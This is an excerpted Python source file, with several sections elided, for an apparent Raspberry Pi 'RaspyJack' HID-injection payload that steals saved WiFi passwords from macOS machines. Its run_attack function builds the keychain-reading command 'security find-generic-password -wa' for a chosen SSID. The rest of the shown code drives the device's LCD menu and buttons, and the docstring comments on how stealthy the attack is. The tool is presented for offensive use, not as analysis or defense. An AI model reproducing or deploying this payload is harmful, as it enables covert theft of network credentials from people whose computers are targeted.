...
"""
RaspyJack *payload* – **HID Attack: Exfiltrate WiFi Passwords (macOS)**
=======================================================================
A HID attack that uses the `security` command-line tool on macOS to
find and export the password for a known WiFi network.

**NOTE:** This will likely cause a GUI prompt asking the user for their
login password to allow access to the keychain. This makes it a much less
stealthy attack than the Windows equivalent.
"""
...
# --- CONFIGURATION ---
# The SSID of the WiFi network you want the password for
WIFI_SSID = "OfficeGuest" # Will be configurable
...
# --- Globals & Shutdown ---
running = True
current_ssid_input = WIFI_SSID # For SSID input
...
def draw_ui(screen_state="main"):
    ...
    d.text((5, 5), "macOS WiFi Pass", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "WiFi SSID:", font=FONT, fill="white")
        d.text((5, 45), WIFI_SSID[:16], font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit SSID | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ssid_input":
        d.text((5, 30), "Enter WiFi SSID:", font=FONT, fill="white")
        ...
        d.text((5, 70), f"SSID: {WIFI_SSID[:16]}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "success":
        d.text((5, 50), "Attack Sent!", font=FONT_TITLE, fill="lime")
        d.text((5, 70), "Check terminal.", font=FONT, fill="white")
...
def handle_text_input_logic(initial_text, screen_state_name, char_set):
    ...
    current_input_ref = current_ssid_input
    cursor_pos_ref = ssid_input_cursor_pos
...
def run_attack():
    ...
    cmd = f"security find-generic-password -wa {WIFI_SSID}"
...
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID macOS WiFi Passwords.", file=sys.stderr)
        sys.exit(1)
    ...
    try:
        while running:
            if current_screen == "main":
                ...
                if GPIO.input(PINS["KEY1"]) == 0: # Edit WiFi SSID
                    current_ssid_input = WIFI_SSID
                    current_screen = "ssid_input"
                    time.sleep(0.3) # Debounce
        ...
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID macOS WiFi Passwords payload finished.")
